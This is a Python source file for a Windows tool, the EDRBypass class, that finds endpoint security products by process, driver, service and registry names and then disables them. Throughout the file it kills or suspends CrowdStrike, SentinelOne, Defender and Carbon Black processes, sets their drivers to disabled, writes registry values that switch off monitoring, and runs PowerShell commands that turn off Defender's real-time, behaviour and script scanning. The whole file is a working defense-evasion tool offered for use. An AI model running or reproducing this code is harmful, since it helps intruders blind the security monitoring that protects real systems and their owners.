import ctypes
import ctypes.wintypes as wintypes
import os
import sys
import time
import random
import subprocess
from ctypes import windll, byref, c_void_p, c_ulong, POINTER

class EDRBypass:
    def __init__(self):
        self.kernel32 = windll.kernel32
        self.ntdll = windll.ntdll
        self.psapi = windll.psapi
        
        self.edr_processes = {
            "CrowdStrike": ["csagent.exe", "csfalcon.exe", "CsFalconService"],
            "SentinelOne": ["sentinelagent.exe", "SentinelHelperService", "SentinelStaticEngine"],
            "Defender": ["MsMpEng.exe", "MpCmdRun.exe", "NisSrv.exe", "SecurityHealthService"],
            "CarbonBlack": ["cb.exe", "cbcomms.exe", "cbservice.exe", "carbonblackk"],
            "Cortex": ["cytray.exe", "cyserver.exe", "CyveraService", "cyoptics.exe"],
            "Symantec": ["ccSvcHst.exe", "RTVSCAN.EXE", "SmcGui.exe", "Smc.exe"],
            "McAfee": ["McShield.exe", "mfewc.exe", "mfefire.exe", "mfemms.exe"],
            "Kaspersky": ["avp.exe", "avpui.exe", "kavtray.exe", "klnagent.exe"],
            "BitDefender": ["bdagent.exe", "updatesrv.exe", "vsserv.exe", "bdservicehost.exe"],
            "TrendMicro": ["ntrtscan.exe", "tmlisten.exe", "pccnt.exe", "tmntsrv.exe"]
        }
        
        self.edr_drivers = [
            "csagent.sys", "csboot.sys", "csdevicecontrol.sys",
            "sentinelmonitor.sys", "hexisfsmonitor.sys",
            "wdfilter.sys", "wdboot.sys", "wddevflt.sys",
            "carbonblackk.sys", "cbstream.sys",
            "cyoptics.sys", "cyprotectdrv.sys",
            "sysplant.sys", "symefa.sys", "symefasi.sys",
            "mfefirek.sys", "mfehidk.sys", "mfewfpk.sys",
            "klif.sys", "klflt.sys", "klbackupdisk.sys",
            "atrsdfw.sys", "bdvedisk.sys", "gzflt.sys",
            "tmcomm.sys", "tmactmon.sys", "tmevtmgr.sys"
        ]
        
    def detect_edr_presence(self):
        detected_edrs = []
        
        detected_edrs.extend(self.detect_edr_processes())
        detected_edrs.extend(self.detect_edr_drivers())
        detected_edrs.extend(self.detect_edr_services())
        detected_edrs.extend(self.detect_edr_registry())
        
        return list(set(detected_edrs))
    
    def detect_edr_processes(self):
        detected = []
        try:
            processes = []
            
            max_processes = 1024
            process_ids = (wintypes.DWORD * max_processes)()
            bytes_returned = wintypes.DWORD()
            
            if self.psapi.EnumProcesses(
                byref(process_ids), 
                ctypes.sizeof(process_ids), 
                byref(bytes_returned)
            ):
                process_count = bytes_returned.value // ctypes.sizeof(wintypes.DWORD)
                
                for i in range(process_count):
                    if process_ids[i] != 0:
                        process_name = self.get_process_name(process_ids[i])
                        if process_name:
                            processes.append(process_name.lower())
            
            for edr_name, edr_processes in self.edr_processes.items():
                for edr_process in edr_processes:
                    if edr_process.lower() in processes:
                        detected.append(edr_name)
                        break
                        
        except Exception:
            pass
            
        return detected
    
    def get_process_name(self, process_id):
        try:
            PROCESS_QUERY_INFORMATION = 0x0400
            PROCESS_VM_READ = 0x0010
            
            process_handle = self.kernel32.OpenProcess(
                PROCESS_QUERY_INFORMATION | PROCESS_VM_READ,
                False,
                process_id
            )
            
            if process_handle:
                image_filename = (ctypes.c_char * 260)()
                if self.psapi.GetProcessImageFileNameA(
                    process_handle, image_filename, 260
                ):
                    self.kernel32.CloseHandle(process_handle)
                    return os.path.basename(image_filename.value.decode('utf-8', errors='ignore'))
                
                self.kernel32.CloseHandle(process_handle)
                
        except Exception:
            pass
            
        return None
    
    def detect_edr_drivers(self):
        detected = []
        try:
            drivers_buffer_size = 1024 * 1024
            drivers_buffer = (ctypes.c_char * drivers_buffer_size)()
            bytes_needed = wintypes.DWORD()
            
            if self.psapi.EnumDeviceDrivers(
                byref(drivers_buffer), 
                drivers_buffer_size, 
                byref(bytes_needed)
            ):
                driver_count = bytes_needed.value // ctypes.sizeof(c_void_p)
                drivers_array = ctypes.cast(drivers_buffer, POINTER(c_void_p))
                
                for i in range(driver_count):
                    driver_name_buffer = (ctypes.c_char * 260)()
                    if self.psapi.GetDeviceDriverBaseNameA(
                        drivers_array[i], 
                        driver_name_buffer, 
                        260
                    ):
                        driver_name = driver_name_buffer.value.decode('utf-8', errors='ignore').lower()
                        if driver_name in self.edr_drivers:
                            for edr_name, edr_processes in self.edr_processes.items():
                                if any(edr_proc.replace('.exe', '.sys') == driver_name 
                                      for edr_proc in edr_processes):
                                    detected.append(edr_name)
                                    break
                                    
        except Exception:
            pass
            
        return detected
    
    def detect_edr_services(self):
        detected = []
        try:
            import winreg
            
            services_key = winreg.OpenKey(
                winreg.HKEY_LOCAL_MACHINE, 
                "SYSTEM\\CurrentControlSet\\Services"
            )
            
            i = 0
            while True:
                try:
                    service_name = winreg.EnumKey(services_key, i)
                    service_name_lower = service_name.lower()
                    
                    for edr_name in self.edr_processes.keys():
                        if edr_name.lower() in service_name_lower:
                            detected.append(edr_name)
                            break
                    
                    i += 1
                except OSError:
                    break
            
            winreg.CloseKey(services_key)
            
        except Exception:
            pass
            
        return detected
    
    def detect_edr_registry(self):
        detected = []
        try:
            import winreg
            
            registry_paths = [
                "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall",
                "SOFTWARE\\WOW6432Node\\Microsoft\\Windows\\CurrentVersion\\Uninstall"
            ]
            
            for reg_path in registry_paths:
                try:
                    uninstall_key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, reg_path)
                    
                    i = 0
                    while True:
                        try:
                            subkey_name = winreg.EnumKey(uninstall_key, i)
                            subkey = winreg.OpenKey(uninstall_key, subkey_name)
                            
                            try:
                                display_name, _ = winreg.QueryValueEx(subkey, "DisplayName")
                                display_name_lower = display_name.lower()
                                
                                for edr_name in self.edr_processes.keys():
                                    if edr_name.lower() in display_name_lower:
                                        detected.append(edr_name)
                                        break
                                        
                            except FileNotFoundError:
                                pass
                            
                            winreg.CloseKey(subkey)
                            i += 1
                        except OSError:
                            break
                    
                    winreg.CloseKey(uninstall_key)
                    
                except Exception:
                    continue
                    
        except Exception:
            pass
            
        return detected
    
    def bypass_crowdstrike(self):
        try:
            cs_processes = ["csagent.exe", "csfalcon.exe"]
            success = False
            
            for process in cs_processes:
                if self.terminate_process_by_name(process):
                    success = True
            
            if self.disable_driver("csagent.sys"):
                success = True
            
            if self.patch_csagent_communication():
                success = True
                
            return success
            
        except Exception:
            return False
    
    def bypass_sentinelone(self):
        try:
            s1_processes = ["sentinelagent.exe", "SentinelHelperService"]
            success = False
            
            for process in s1_processes:
                if self.terminate_process_by_name(process):
                    success = True
            
            if self.disable_driver("sentinelmonitor.sys"):
                success = True
            
            if self.patch_s1_registry():
                success = True
                
            return success
            
        except Exception:
            return False
    
    def bypass_defender_atp(self):
        try:
            defender_processes = ["MsMpEng.exe", "SecurityHealthService"]
            success = False
            
            for process in defender_processes:
                if self.suspend_process_by_name(process):
                    success = True
            
            if self.disable_defender_realtime():
                success = True
            
            if self.patch_defender_signatures():
                success = True
                
            return success
            
        except Exception:
            return False
    
    def bypass_carbon_black(self):
        try:
            cb_processes = ["cb.exe", "cbcomms.exe", "cbservice.exe"]
            success = False
            
            for process in cb_processes:
                if self.terminate_process_by_name(process):
                    success = True
            
            if self.disable_driver("carbonblackk.sys"):
                success = True
                
            return success
            
        except Exception:
            return False
    
    def terminate_process_by_name(self, process_name):
        try:
            max_processes = 1024
            process_ids = (wintypes.DWORD * max_processes)()
            bytes_returned = wintypes.DWORD()
            
            if self.psapi.EnumProcesses(
                byref(process_ids), 
                ctypes.sizeof(process_ids), 
                byref(bytes_returned)
            ):
                process_count = bytes_returned.value // ctypes.sizeof(wintypes.DWORD)
                
                for i in range(process_count):
                    if process_ids[i] != 0:
                        current_process_name = self.get_process_name(process_ids[i])
                        if current_process_name and current_process_name.lower() == process_name.lower():
                            return self.terminate_process_by_id(process_ids[i])
                            
        except Exception:
            pass
            
        return False
    
    def terminate_process_by_id(self, process_id):
        try:
            PROCESS_TERMINATE = 0x0001
            
            process_handle = self.kernel32.OpenProcess(
                PROCESS_TERMINATE, 
                False, 
                process_id
            )
            
            if process_handle:
                result = self.kernel32.TerminateProcess(process_handle, 1)
                self.kernel32.CloseHandle(process_handle)
                return result != 0
                
        except Exception:
            pass
            
        return False
    
    def suspend_process_by_name(self, process_name):
        try:
            max_processes = 1024
            process_ids = (wintypes.DWORD * max_processes)()
            bytes_returned = wintypes.DWORD()
            
            if self.psapi.EnumProcesses(
                byref(process_ids), 
                ctypes.sizeof(process_ids), 
                byref(bytes_returned)
            ):
                process_count = bytes_returned.value // ctypes.sizeof(wintypes.DWORD)
                
                for i in range(process_count):
                    if process_ids[i] != 0:
                        current_process_name = self.get_process_name(process_ids[i])
                        if current_process_name and current_process_name.lower() == process_name.lower():
                            return self.suspend_process_by_id(process_ids[i])
                            
        except Exception:
            pass
            
        return False
    
    def suspend_process_by_id(self, process_id):
        try:
            ntdll = windll.ntdll
            
            PROCESS_SUSPEND_RESUME = 0x0800
            
            process_handle = self.kernel32.OpenProcess(
                PROCESS_SUSPEND_RESUME, 
                False, 
                process_id
            )
            
            if process_handle:
                result = ntdll.NtSuspendProcess(process_handle)
                self.kernel32.CloseHandle(process_handle)
                return result == 0
                
        except Exception:
            pass
            
        return False
    
    def disable_driver(self, driver_name):
        try:
            import winreg
            
            driver_key_path = f"SYSTEM\\CurrentControlSet\\Services\\{driver_name.replace('.sys', '')}"
            
            key = winreg.OpenKey(
                winreg.HKEY_LOCAL_MACHINE, 
                driver_key_path, 
                0, 
                winreg.KEY_SET_VALUE
            )
            
            winreg.SetValueEx(key, "Start", 0, winreg.REG_DWORD, 4)
            winreg.CloseKey(key)
            
            return True
            
        except Exception:
            return False
    
    def patch_csagent_communication(self):
        try:
            import winreg
            
            cs_keys = [
                "SOFTWARE\\CrowdStrike\\{9b03c1d1-6949-4d57-921f-b5fb1c6896c7}",
                "SYSTEM\\CurrentControlSet\\Services\\CSAgent"
            ]
            
            for key_path in cs_keys:
                try:
                    key = winreg.OpenKey(
                        winreg.HKEY_LOCAL_MACHINE, 
                        key_path, 
                        0, 
                        winreg.KEY_SET_VALUE
                    )
                    
                    winreg.SetValueEx(key, "Start", 0, winreg.REG_DWORD, 4)
                    winreg.SetValueEx(key, "CommunicationDisabled", 0, winreg.REG_DWORD, 1)
                    winreg.CloseKey(key)
                    
                except Exception:
                    continue
            
            return True
            
        except Exception:
            return False
    
    def patch_s1_registry(self):
        try:
            import winreg
            
            s1_keys = [
                "SOFTWARE\\SentinelOne",
                "SYSTEM\\CurrentControlSet\\Services\\SentinelAgent"
            ]
            
            for key_path in s1_keys:
                try:
                    key = winreg.OpenKey(
                        winreg.HKEY_LOCAL_MACHINE, 
                        key_path, 
                        0, 
                        winreg.KEY_SET_VALUE
                    )
                    
                    winreg.SetValueEx(key, "Start", 0, winreg.REG_DWORD, 4)
                    winreg.SetValueEx(key, "MonitoringDisabled", 0, winreg.REG_DWORD, 1)
                    winreg.CloseKey(key)
                    
                except Exception:
                    continue
            
            return True
            
        except Exception:
            return False
    
    def disable_defender_realtime(self):
        try:
            powershell_commands = [
                "Set-MpPreference -DisableRealtimeMonitoring $true",
                "Set-MpPreference -DisableBehaviorMonitoring $true", 
                "Set-MpPreference -DisableBlockAtFirstSeen $true",
                "Set-MpPreference -DisableIOAVProtection $true",
                "Set-MpPreference -DisablePrivacyMode $true",
                "Set-MpPreference -SignatureDisableUpdateOnStartupWithoutEngine $true",
                "Set-MpPreference -DisableArchiveScanning $true",
                "Set-MpPreference -DisableIntrusionPreventionSystem $true",
                "Set-MpPreference -DisableScriptScanning $true"
            ]
            
            for cmd in powershell_commands:
                try:
                    subprocess.run(
                        ["powershell", "-Command", cmd], 
                        capture_output=True, 
                        timeout=10
                    )
                except:
                    continue
            
            return True
            
        except Exception:
            return False
    
    def patch_defender_signatures(self):
        try:
            import winreg
            
            defender_keys = [
                "SOFTWARE\\Microsoft\\Windows Defender\\Real-Time Protection",
                "SOFTWARE\\Policies\\Microsoft\\Windows Defender"
            ]
            
            for key_path in defender_keys:
                try:
                    key = winreg.OpenKey(
                        winreg.HKEY_LOCAL_MACHINE, 
                        key_path, 
                        0, 
                        winreg.KEY_SET_VALUE
                    )
                    
                    winreg.SetValueEx(key, "DisableRealtimeMonitoring", 0, winreg.REG_DWORD, 1)
                    winreg.SetValueEx(key, "DisableBehaviorMonitoring", 0, winreg.REG_DWORD, 1)
                    winreg.SetValueEx(key, "DisableOnAccessProtection", 0, winreg.REG_DWORD, 1)
                    winreg.CloseKey(key)
                    
                except Exception:
                    continue
            
            return True
            
        except Exception:
            return False
    
    def bypass_all_detected(self):
        detected_edrs = self.detect_edr_presence()
        
        if not detected_edrs:
            return True
        
        bypass_methods = {
            "CrowdStrike": self.bypass_crowdstrike,
            "SentinelOne": self.bypass_sentinelone,
            "Defender": self.bypass_defender_atp,
            "CarbonBlack": self.bypass_carbon_black
        }
        
        success_count = 0
        for edr in detected_edrs:
            if edr in bypass_methods:
                try:
                    if bypass_methods[edr]():
                        success_count += 1
                except:
                    continue
        
        return success_count > 0
